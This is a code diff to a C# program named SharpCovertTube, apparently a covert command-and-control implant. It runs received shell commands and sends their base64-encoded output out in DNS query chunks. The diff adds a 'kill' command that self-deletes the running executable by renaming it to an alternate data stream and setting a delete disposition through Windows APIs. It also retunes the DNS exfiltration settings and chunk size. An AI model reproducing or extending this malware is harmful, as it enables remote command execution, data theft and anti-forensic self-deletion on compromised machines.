@@ -33,11 +33,27 @@ namespace SharpCovertTube
         // Log file 
         public const string log_file = "c:\\temp\\.sharpcoverttube.log";
         // Exfiltrate command responses through DNS or not
-        public const bool dns_exfiltration = true;
+        public const bool dns_exfiltration = false;
         // DNS hostname used for DNS exfiltration
-        public const string dns_hostname = ".test.org";
+        public const string dns_hostname = ".test.com";
 
         [DllImport("wininet.dll")] private extern static bool InternetGetConnectedState(out int Description, int ReservedValue);
+        [DllImport("kernel32.dll", SetLastError = true)] private static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, uint hTemplateFile);
+        [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)] static extern Int32 WSAGetLastError();
+        [DllImport("Kernel32.dll", SetLastError = true)] private static extern int SetFileInformationByHandle(IntPtr hFile, FileInformationClass FileInformationClass, IntPtr FileInformation, Int32 dwBufferSize);
+        [DllImport("Kernel32.dll", SetLastError = true)] private static extern bool CloseHandle(IntPtr handle);
+        [DllImport("kernel32.dll", SetLastError = true)][PreserveSig] public static extern uint GetModuleFileName([In] IntPtr hModule, [Out] StringBuilder lpFilename, [In][MarshalAs(UnmanagedType.U4)] int nSize);
+        
+        enum FileInformationClass : int { FileBasicInfo = 0, FileStandardInfo = 1, FileNameInfo = 2, FileRenameInfo = 3, FileDispositionInfo = 4, FileAllocationInfo = 5, FileEndOfFileInfo = 6, FileStreamInfo = 7, FileCompressionInfo = 8, FileAttributeTagInfo = 9, FileIdBothDirectoryInfo = 10, FileIdBothDirectoryRestartInfo = 11, FileIoPriorityHintInfo = 12, FileRemoteProtocolInfo = 13, FileFullDirectoryInfo = 14, FileFullDirectoryRestartInfo = 15, FileStorageInfo = 16, FileAlignmentInfo = 17, FileIdInfo = 18, FileIdExtdDirectoryInfo = 19, FileIdExtdDirectoryRestartInfo = 20, }
+        
+        [StructLayout(LayoutKind.Sequential)] public unsafe struct filerenameinfo_struct { public bool ReplaceIfExists; public IntPtr RootDirectory; public uint FileNameLength; public fixed byte filename[255]; }
+        [StructLayout(LayoutKind.Sequential)] public struct filedispositioninfo_struct { public bool DeleteFile; }
+        
+        const uint DELETE = (uint)0x00010000L;
+        const uint SYNCHRONIZE = (uint)0x00100000L;
+        const uint FILE_SHARE_READ = 0x00000001;
+        const uint OPEN_EXISTING = 3;
+        const int MAX_PATH = 256;
 
 
         static void LogShow(string msg) {
@@ -104,9 +120,7 @@ namespace SharpCovertTube
         }
 
 
-        // Source: MSDN
-        static string ExecuteCommand(string command)
-        {
+        static string OrdinaryCmd(string command) {
             string output = "";
             using (Process process = new Process())
             {
@@ -120,6 +134,107 @@ namespace SharpCovertTube
                 process.WaitForExit();
             }
             return output;
+        }
+
+
+        static void DeleteAndKill() {
+            StringBuilder fname = new System.Text.StringBuilder(MAX_PATH);
+            GetModuleFileName(IntPtr.Zero, fname, MAX_PATH);
+            string filename = fname.ToString();
+            string new_name = ":Random";
+
+            // Handle to current file
+            IntPtr hFile = CreateFileW(filename, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
+            int last_error = WSAGetLastError();
+            if (last_error != 0 || hFile == IntPtr.Zero)
+            {
+                System.Environment.Exit(0);
+            }
+
+            // Creating FILE_RENAME_INFO struct
+            filerenameinfo_struct fri = new filerenameinfo_struct();
+            fri.ReplaceIfExists = true;
+            fri.RootDirectory = IntPtr.Zero;
+            uint FileNameLength = (uint)(new_name.Length * 2);
+            fri.FileNameLength = FileNameLength;
+            int size = Marshal.SizeOf(typeof(filerenameinfo_struct)) + (new_name.Length + 1) * 2;
+
+            IntPtr fri_addr = IntPtr.Zero;
+            unsafe
+            {
+                // Get Address of FILE_RENAME_INFO struct
+                filerenameinfo_struct* pfri = &fri;
+                fri_addr = (IntPtr)pfri;
+
+                // Copy new file name (bytes) to filename member in FILE_RENAME_INFO struct
+                byte* p = fri.filename;
+                byte[] filename_arr = Encoding.Unicode.GetBytes(new_name);
+                foreach (byte b in filename_arr)
+                {
+                    *p = b;
+                    p += 1;
+                }
+            }
+            // Rename file calling SetFileInformationByHandle
+            int sfibh_res = SetFileInformationByHandle(hFile, FileInformationClass.FileRenameInfo, fri_addr, size);
+            last_error = WSAGetLastError();
+            if (sfibh_res == 0)
+            {
+                System.Environment.Exit(0);
+            }
+
+            // Close handle to finally rename file
+            bool ch_res = CloseHandle(hFile);
+
+            // Handle to current file
+            IntPtr hFile2 = CreateFileW(filename, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
+            last_error = WSAGetLastError();
+            if (last_error != 0 || hFile == IntPtr.Zero)
+            {
+                System.Environment.Exit(0);
+            }
+
+            // Creating FILE_DISPOSITION_INFO struct
+            filedispositioninfo_struct fdi = new filedispositioninfo_struct();
+            fdi.DeleteFile = true;
+            IntPtr fdi_addr = IntPtr.Zero;
+            int size_fdi = Marshal.SizeOf(typeof(filedispositioninfo_struct));
+
+            unsafe
+            {
+                // Get Address of FILE_DISPOSITION_INFO struct
+                filedispositioninfo_struct* pfdi = &fdi;
+                fdi_addr = (IntPtr)pfdi;
+            }
+
+            // Rename file calling SetFileInformationByHandle
+            int sfibh_res2 = SetFileInformationByHandle(hFile2, FileInformationClass.FileDispositionInfo, fdi_addr, size_fdi);
+            last_error = WSAGetLastError();
+            if (sfibh_res == 0 || last_error != 0)
+            {
+                System.Environment.Exit(0);
+            }
+
+            // Close handle to finally delete file
+            bool ch_res2 = CloseHandle(hFile2);
+            
+            // Exiting...
+            System.Environment.Exit(0);
+        }
+
+
+        // Source: MSDN
+        static string ExecuteCommand(string command)
+        {
+            if (command == "kill")
+            {
+                DeleteAndKill();
+                return "";
+            }
+            else {
+                string output = OrdinaryCmd(command);
+                return output;
+            }    
         }
 
 
@@ -147,7 +262,7 @@ namespace SharpCovertTube
             }
             string base64_response_cmd = Base64Encode(response_cmd);
             LogShow("Base64-encoded response:\t\t"+ base64_response_cmd);
-            int max_size = 50; // 255 - dns_hostname.Length - 1; <-- These sizes generate errors and I dont know why
+            int max_size = 255 - dns_hostname.Length - 2; // 255 - dns_hostname.Length - 1; <-- These sizes generate errors and I dont know why
             if (base64_response_cmd.Length > max_size) {
                 LogShow("Splitting encoded response in chunks of "+ max_size + " characters");
             }
